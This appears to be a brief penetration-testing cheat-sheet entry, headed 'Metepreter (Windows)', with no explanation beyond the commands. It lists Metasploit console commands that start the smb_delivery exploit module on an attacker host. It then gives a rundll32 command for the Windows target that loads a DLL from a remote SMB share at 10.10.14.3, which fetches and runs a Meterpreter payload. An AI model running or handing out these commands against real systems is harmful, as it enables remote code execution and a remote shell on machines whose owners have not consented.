
# Metepreter (Windows)

```powershell
# attack host
msfconsole -q
use exploit/windows/smb/smb_delivery
set target 0
exploit

# window (copy cmd from msfconsole output)
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```